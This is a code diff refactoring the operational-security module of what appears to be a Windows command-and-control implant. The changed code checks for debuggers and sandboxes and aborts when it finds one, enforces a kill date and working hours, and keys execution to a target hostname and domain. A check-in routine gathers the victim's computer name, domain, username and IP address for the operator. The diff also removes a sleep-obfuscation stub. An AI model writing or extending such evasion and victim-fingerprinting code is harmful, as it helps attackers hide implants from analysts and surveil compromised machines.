@@ -1,34 +1,38 @@
-#include <core/include/opsec.hpp>
+#include <include/opsec.hpp>
+using namespace Stream;
+using namespace Commands;
+using namespace Utils::Time;
+
 namespace Opsec {
 
     BOOL RuntimeChecks() {
-
-        bool success = true;
 #ifndef DEBUG
-        if (CheckDebugger()) { Utils::Time::Timeout(MINUTES(1)); success_(false); }
+        if (CheckDebugger()) {
+            Timeout(MINUTES(1));
+            return false;
+        }
 #endif
-        if (CheckSandbox()) { Utils::Time::Timeout(MINUTES(1)); success_(false); }
+        if (CheckSandbox()) {
+            Timeout(MINUTES(1));
+            return false;
+        }
 
-        defer:
-        return success;
+        return true;
     }
 
     BOOL CheckTime() {
 
-        bool success = true;
-
         if (Ctx->config.killdate != 0) {
-            if (Utils::Time::GetTimeNow() >= Ctx->config.killdate) {
-                Commands::Shutdown(nullptr);
+            if (GetTimeNow() >= Ctx->config.killdate) {
+                Shutdown(nullptr);
             }
         }
-
         if (Ctx->config.hours) {
-            x_assertb(Utils::Time::InWorkingHours());
+            if (!InWorkingHours()) {
+                return false;
+            }
         }
-
-        defer:
-        return success;
+        return true;
     }
 
     BOOL CheckDebugger() {
@@ -73,7 +77,7 @@ namespace Opsec {
     BOOL CheckEnvironment() {
         // todo: add more information to the checkin message
 
-        _stream *out            = Stream::CreateStreamWithHeaders(TypeCheckin);
+        _stream *out            = CreateStreamWithHeaders(TypeCheckin);
         IP_ADAPTER_INFO adapter = { };
 
         unsigned long length    = MAX_PATH;
@@ -81,44 +85,51 @@ namespace Opsec {
         bool success            = true;
 
         if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &length)) {
-            x_assertb(x_strncmp(Ctx->config.hostname, buffer, x_strlen(Ctx->config.hostname)) == 0);
-            Stream::PackString(out, buffer);
+            if (Ctx->config.hostname[0]) {
+                if (x_strncmp(buffer, Ctx->config.hostname, x_strlen(Ctx->config.hostname)) != 0) {
+                    return false;
+                }
+            }
+            PackString(out, buffer);
         }
         else {
-            Stream::PackDword(out, 0);
+            PackDword(out, 0);
         }
 
         x_memset(buffer, 0, MAX_PATH);
         length = MAX_PATH;
 
-        if (Ctx->transport.domain[0]) {
-            if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &length)) {
-                x_assertb(x_strncmp(Ctx->transport.domain, buffer, x_strlen(Ctx->transport.domain)) == 0);
-                Stream::PackString(out, buffer);
+        if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &length)) {
+            if (Ctx->transport.domain[0]) {
+                if (x_strncmp(Ctx->transport.domain, buffer, x_strlen(Ctx->transport.domain)) != 0) {
+                    return false;
+                }
             }
-            else {
-                Stream::PackDword(out, 0);
-            }
+            PackString(out, buffer);
         }
+        else {
+            PackDword(out, 0);
+        }
+
 
         x_memset(buffer, 0, MAX_PATH);
         length = MAX_PATH;
 
         if (Ctx->win32.GetUserNameA((LPSTR) buffer, &length)) {
-            Stream::PackString(out, buffer);
+            PackString(out, buffer);
         }
         else {
-            Stream::PackDword(out, 0);
+            PackDword(out, 0);
         }
 
         x_memset(buffer, 0, MAX_PATH);
         length = sizeof(IP_ADAPTER_INFO);
 
         if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
-            Stream::PackString(out, adapter.IpAddressList.IpAddress.String);
+            PackString(out, adapter.IpAddressList.IpAddress.String);
         }
         else {
-            Stream::PackDword(out, 0);
+            PackDword(out, 0);
         }
 
         x_memset(&adapter, 0, sizeof(IP_ADAPTER_INFO));
@@ -156,8 +167,4 @@ namespace Opsec {
         return true;
     }
 
-    VOID SleepObf() {
-        // todo: re-implement proper sleep obfuscation with https://github.com/y11en/FOLIAGE for the time being.
-        Utils::Time::Timeout(Utils::Random::RandomSleepTime());
-    }
 }
